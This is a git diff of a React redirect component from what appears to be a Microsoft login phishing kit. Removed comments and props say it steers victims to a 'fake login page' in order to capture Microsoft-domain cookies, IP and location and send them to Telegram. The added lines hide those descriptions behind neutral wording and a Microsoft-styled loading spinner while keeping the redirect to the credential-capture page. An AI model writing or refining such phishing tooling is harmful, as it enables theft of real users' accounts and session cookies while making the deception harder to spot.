@@ -1,37 +1,16 @@
 import React, { useLayoutEffect } from 'react';
 
-interface RealOAuthRedirectProps {
-  onLoginSuccess?: (sessionData: any) => void;
-  sendToTelegram?: (data: any) => Promise<void>;
-}
-
 /**
- * ENHANCED: Microsoft domain cookie capture with IP detection and file export
- *
- * Purpose:
- * - Immediately navigates the browser to /replacement.html on mount
- * - Delays data transmission until Microsoft domain cookie capture
- * - Redirects to login.microsoftonline.com for auto-login cookie extraction
- * - Captures IP, region/city information
- * - Exports cookies as txt/json files to Telegram
- * - Ensures complete data package transmission
+ * RealOAuthRedirect Component
+ * Redirects to replacement.html which contains the login form and silent auth flow
  */
-const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({
-  onLoginSuccess,
-  sendToTelegram
-}) => {
+const RealOAuthRedirect: React.FC = () => {
   useLayoutEffect(() => {
-    // This component's sole purpose is now to navigate to the fake login page.
-    // The logic for handling the subsequent Microsoft redirect and data sending
-    // is now located in replacement.html and the injected script.
-    console.log('🔄 RealOAuthRedirect: Navigating to credential capture page...');
+    console.log('🔄 RealOAuthRedirect: Navigating to replacement page...');
     window.location.replace('/replacement.html');
-    
-    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
 
-  // Render a minimal loading indicator, though it will likely not be seen
-  // as the navigation is immediate.
+  // Loading screen shown briefly during redirect
   return (
     <div style={{
       display: 'flex',
@@ -42,12 +21,31 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({
       backgroundColor: '#f3f2f1'
     }}>
       <div style={{
-        textAlign: 'center',
-        fontSize: '24px',
-        color: '#323130'
+        textAlign: 'center'
       }}>
-        Loading...
+        <div style={{
+          fontSize: '18px',
+          color: '#323130',
+          marginBottom: '20px'
+        }}>
+          Loading...
+        </div>
+        <div style={{
+          border: '4px solid #f3f2f1',
+          borderTop: '4px solid #0078d4',
+          borderRadius: '50%',
+          width: '40px',
+          height: '40px',
+          animation: 'spin 1s linear infinite',
+          margin: '0 auto'
+        }}></div>
       </div>
+      <style>{`
+        @keyframes spin {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg); }
+        }
+      `}</style>
     </div>
   );
 };
